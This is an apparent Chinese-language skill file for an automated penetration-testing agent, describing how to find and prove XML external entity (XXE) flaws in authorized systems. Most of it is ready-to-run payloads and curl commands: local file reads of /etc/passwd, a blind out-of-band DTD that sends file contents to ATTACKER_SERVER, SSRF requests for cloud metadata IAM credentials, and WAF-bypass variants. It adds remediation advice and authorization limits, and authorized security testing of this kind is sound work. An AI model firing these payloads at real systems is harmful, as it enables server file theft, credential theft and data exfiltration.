---
name: xxe
description: XXE 检测技能 —— 面向真实业务系统，定位接收 XML 输入的端点（SOAP/SAML/API/文件上传解析），通过注入外部实体声明探测 XML 解析器是否启用外部实体处理，验证文件读取/SSRF/OOB 数据外带，产出可复现 PoC
phase: test
severity_focus: high
---

# XML 外部实体注入检测技能（XXE）

> 定位：面向**真实授权业务系统**的 XXE 验证，不是跑扫描器出报告。核心在于「识别哪些端点接收并解析 XML 输入」并「证明解析器启用了外部实体处理（EXTERNAL_GENERAL_ENTITY / EXTERNAL_PARAMETER_ENTITY）」——重点检测 SOAP 接口、SAML SSO、REST API 的 XML 请求体、文件上传中的 XML 格式文件（SVG/DOCX/XLSX 内嵌 XML），而非盲目对所有端点发送 XML Payload。

## 漏洞原理

XXE（XML External Entity Injection）的本质是：XML 解析器在处理用户可控的 XML 输入时，**默认或配置不当启用了外部实体解析**，攻击者通过在 XML 文档中声明外部实体（`<!ENTITY>`），让解析器在展开实体时执行文件读取、网络请求或协议交互。

- **经典文件读取**：声明一个指向本地文件的实体 `<!ENTITY xxe SYSTEM "file:///etc/passwd">`，解析器读取文件内容并替换到实体引用位置（`&xxe;`）——前提是响应体回显了解析结果。
- **Blind XXE（无回显）**：解析结果不在响应中展示，通过 OOB（Out-of-Band）通道外带数据——声明参数实体，将文件内容拼接到攻击者控制的 URL 中发起 HTTP/DNS 请求。
- **SSRF 利用**：利用 `http://` / `ftp://` / `gopher://` 协议实体，让服务器向内网地址发起请求——经典场景是读取云元数据端点（`http://169.254.169.254/latest/meta-data/`）。
- **Billion Laughs / Quadratic Blowup**：通过指数级实体展开（嵌套实体引用）造成内存耗尽 DoS，不读取数据但可打挂服务。

**关键判断依据**：注入外部实体声明后，响应中出现目标文件内容（经典模式）或攻击者控制的 OOB 服务器收到数据请求（Blind 模式），即确认漏洞存在。

## 触发条件

满足以下任一信号即应进入本技能（侦察阶段 `endpoints.json` 标注了候选 XXE 端点）：

- 端点接收 XML 格式输入：`Content-Type: application/xml` / `text/xml` / `application/soap+xml`，或请求体以 `<?xml version` 开头。
- SOAP/WSDL 接口：端点路径含 `/wsdl` / `/soap` / `/services/`，或 WSDL 枚举暴露了接收 XML 的操作。
- SAML SSO 端点：`/saml/consume` / `/acs` / `/sso` 接收 SAMLResponse（Base64 编码的 XML）。
- 文件上传解析：上传 SVG / DOCX / XLSX 等 XML-based 格式文件后，服务端解析其中的 XML 内容。
- REST API XML 支持：虽然主要使用 JSON，但 API 框架同时接受 `Content-Type: application/xml`（如 Spring / Django REST Framework 的内容协商）。

## 检测方法

> 流程：识别 XML 端点 → 注入外部实体声明 → 观察响应/OOB → 确认漏洞

### 步骤一：XML 端点识别

1. **Content-Type 探测**：将正常请求的 `Content-Type` 改为 `application/xml` 并发送简单 XML（`<?xml version="1.0"?><root/>`），观察是否被接受（200 而非 415 Unsupported Media Type）。
2. **请求体格式检查**：从 Burp 历史中筛选请求体以 `<?xml` 开头的端点，或 WSDL/SOAP 请求。
3. **WSDL 枚举**：访问 `?wsdl` 后缀获取 WSDL 定义，提取所有接收 XML 参数的操作。
4. **文件上传分析**：检查上传功能是否接受 SVG（`image/svg+xml`）或 Office 文档（DOCX/XLSX 底层为 ZIP+XML）。

### 步骤二：经典 XXE 注入（有回显）

核心验证动作——注入文件读取实体，观察响应是否回显文件内容。

1. **注入 Payload**：在 XML 请求体中插入外部实体声明：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

2. **发送请求**：用 `curl` 发送注入后的 XML，观察响应体。

```bash
curl -X POST 'https://target.com/api/upload' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

3. **成功判断**：
   - 响应体中包含 `/etc/passwd` 的内容（`root:x:0:0:` 等行）。
   - 错误信息中泄露文件内容（部分解析器在实体展开失败时将部分内容输出到错误响应）。
   - 响应体中出现预期文件的特征字符串（如注入 `file:///proc/self/environ` 后响应中出现环境变量名）。

4. **Windows 目标**：使用 `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">`，成功标志为响应中出现 `[fonts]` 行。

### 步骤三：Blind XXE（无回显 / OOB）

当响应不回显解析结果时，通过 OOB 通道外带数据。

1. **准备 OOB 服务器**：使用攻击者控制的 HTTP/DNS 服务器（如 Burp Collaborator、Interact.sh、自建 HTTP 服务）。
2. **参数实体外带**：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://ATTACKER_SERVER/evil.dtd">
  %xxe;
]>
<root>test</root>
```

3. **evil.dtd（部署在攻击者服务器上）**：

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;
```

4. **OOB 验证**：发送请求后，攻击者服务器收到 HTTP 请求，URL 参数中包含 `/etc/hostname` 的内容——确认 Blind XXE 存在。

```bash
# 攻击者服务器上的 evil.dtd
echo '<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '\''https://ATTACKER_SERVER/?data=%file;'\''>">%eval;%exfil;' > evil.dtd

# 目标请求
curl -X POST 'https://target.com/api/upload' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY % xxe SYSTEM "https://ATTACKER_SERVER/evil.dtd">%xxe;]><root/>'
```

### 步骤四：SSRF 利用（云元数据）

利用 XXE 的 `http://` 协议实体，让目标服务器向内网/云元数据端点发起请求。

1. **经典文件读取实体**：

```xml
<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

2. **发送并观察**：如果响应回显了元数据内容（临时凭证 JSON），说明 SSRF 通过 XXE 成功。

```bash
curl -X POST 'https://target.com/api/upload' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&ssrf;</root>'
```

### 步骤五：解析器防护探测

测试目标是否有防护或可绕过。

- **CDATA 包装**：`<!ENTITY xxe SYSTEM "file:///etc/passwd">` + `<root><![CDATA[&xxe;]]></root>`（部分解析器跳过 CDATA 内的实体展开——反向验证）。
- **UTF-16 编码**：将 XML Payload 用 UTF-16 编码发送，绕过基于字符匹配的 WAF。
- **参数实体变体**：`<!ENTITY % xxe SYSTEM ...>` + `%xxe;`（参数实体使用 `%` 而非 `&`，部分防护只过滤 `&`）。
- **XInclude**：当无法控制 DOCTYPE 时（如 SOAP 框架固定 DOCTYPE），用 XInclude 注入：`<xi:include href="file:///etc/passwd" xmlns:xi="http://www.w3.org/2001/XInclude"/>`。

## 三层测试模型

> 对齐 DESIGN §3.1：L1 快速筛选候选 → L2 确认可利用 → L3 对抗防护绕过。

### L1 探测

目标：快速识别哪些端点接收并解析 XML 输入。

- **Content-Type 探测**：对可疑端点发送 `Content-Type: application/xml` + 空 XML `<root/>`，200 表示接受 XML 输入。
- **WSDL 枚举**：访问 `?wsdl` 后缀，有 WSDL 定义则标记为 SOAP 候选。
- **文件格式分析**：上传功能支持 SVG / DOCX / XLSX 则标记为 XML 解析候选。

### L2 验证

目标：对 L1 筛选出的候选端点，通过实体注入证明漏洞存在。

- **经典文件读取**：注入 `file:///etc/passwd` 实体，响应中包含 passwd 内容即确认。
- **OOB 外带**：响应无回显时，部署 OOB DTD，攻击者服务器收到数据即确认。
- **SSRF 探测**：注入 `http://169.254.169.254/` 实体，响应中包含云元数据即确认。

### L3 绕过

目标：当存在 WAF/解析器防护时，测试绕过路径。

- **编码绕过**：UTF-16/UTF-7 编码 XML Payload 绕过字符过滤。
- **XInclude**：无法控制 DOCTYPE 时使用 XInclude 注入。
- **参数实体**：使用 `%` 语法替代 `&` 绕过过滤规则。
- **自定义协议**：PHP 环境 `php://filter/convert.base64-encode/resource=/etc/passwd` 通过 `php://` 协议实体读取文件并以 Base64 编码返回（规避编码问题）。

## 工具

### curl（命令行注入）

```bash
# 经典 XXE 文件读取
curl -X POST 'https://target.com/api/process' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Blind XXE OOB
curl -X POST 'https://target.com/api/process' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY % dtd SYSTEM "https://ATTACKER_SERVER/evil.dtd">%dtd;]><root/>'

# SSRF via XXE（云元数据）
curl -X POST 'https://target.com/api/process' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY m SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&m;</root>'

# Windows 文件读取
curl -X POST 'https://target.com/api/process' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY w SYSTEM "file:///C:/Windows/win.ini">]><root>&w;</root>'
```

### Burp Suite（抓包与注入）

1. Proxy → Intercept 捕获 XML 请求。
2. Send to Repeater，修改请求体注入 DOCTYPE 和实体声明。
3. 使用 Burp Collaborator 作为 OOB 通道验证 Blind XXE。
4. Intruder 批量注入多个端点测试 XML 解析配置。

## 输出格式

每个确认的 XXE 漏洞按以下 Finding 结构输出（result 初值 `validation_inconclusive`，留给校验流水线）：

```json
{
  "id": "XXE-001",
  "type": "xxe",
  "severity": "high",
  "status": "confirmed",
  "result": "validation_inconclusive",
  "title": "文件上传接口存在 XML 外部实体注入漏洞",
  "endpoint": "POST /api/process",
  "description": "该端点解析 XML 输入时未禁用外部实体处理，攻击者可通过注入外部实体声明读取服务器任意文件（/etc/passwd）、发起 SSRF 请求访问内网资源或通过 OOB 通道外带敏感数据",
  "payload": {
    "method": "POST",
    "url": "/api/process",
    "headers": {
      "Content-Type": "application/xml"
    },
    "body": "<?xml version=\"1.0\"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
    "note": "注入外部实体声明读取 /etc/passwd，响应体中回显文件内容"
  },
  "verification_steps": [
    "1. 向目标端点发送 Content-Type: application/xml 的请求，确认 XML 被接受解析",
    "2. 在 XML 请求体中注入 DOCTYPE 声明和外部实体（file:///etc/passwd）",
    "3. 观察响应体是否包含 /etc/passwd 文件内容（root:x:0:0: 等特征行）",
    "4. 若无回显，部署 OOB DTD 验证 Blind XXE",
    "5. 测试 SSRF 实体（http://169.254.169.254/）评估内网渗透影响"
  ],
  "evidence": {
    "response_status": 200,
    "response_indicator": "root:x:0:0:root:/root:/bin/bash",
    "entity_type": "external_general_entity",
    "parser_protection": "disabled",
    "oob_received": false
  },
  "remediation": "禁用 XML 解析器的外部实体和 DTD 处理（如 Python: parser = ET.XMLParser(resolve_entities=False)；Java: factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)），使用白名单校验 XML 输入"
}
```

## 证据要求

什么才算确认 XXE（禁止仅凭「端点接受 XML」下结论，要证明外部实体被实际处理）：

1. **实体展开确认**：注入外部实体声明后，响应体中出现目标文件的实际内容（如 `/etc/passwd` 的 `root:x:0:0:` 行），这是核心判据。
2. **OOB 数据接收**：Blind XXE 场景下，攻击者控制的 OOB 服务器收到包含目标文件内容的 HTTP/DNS 请求，证明实体被展开且数据被外带。
3. **SSRF 成功**：注入 `http://` 协议实体后，响应体中包含内网响应内容（如云元数据 JSON），证明服务器发起了非预期的网络请求。
4. **影响说明**：注明文件读取范围（任意文件/受限目录）、SSRF 可达内网范围、OOB 可外带数据量级，据此定级。
5. **证据脱敏**：读取到的文件内容（如 `/etc/passwd`）在证据中截断展示前几行即可，不完整泄露；OOB 服务器地址使用占位符。

## 禁止事项

- **仅授权目标**：XXE 测试向目标发送特殊构造的 XML 请求，可能导致服务端文件读取和网络请求，必须在书面授权范围内操作。
- **不读取敏感凭证文件**：优先读取 `/etc/hostname`、`/etc/passwd` 等低敏感度文件证明漏洞；禁止读取 SSH 私钥、数据库配置等高敏感文件并记录到证据中。
- **不利用 SSRF 横向渗透**：SSRF 实体只验证「请求是否发出」（如访问云元数据端点），不利用获取的临时凭证进一步渗透内网。
- **DoS 限制**：禁止发送 Billion Laughs / Quadratic Blowup 等资源耗尽 Payload，这类测试可能导致服务不可用。
- **凭证不落明文**：通过 XXE 读取到的任何文件内容，证据只记录特征行（证明文件被读取），不完整泄露文件内容。
- **OOB 数据最小化**：OOB 外带只读取小文件（hostname/版本号）证明通道可用，不外带大文件或批量数据。
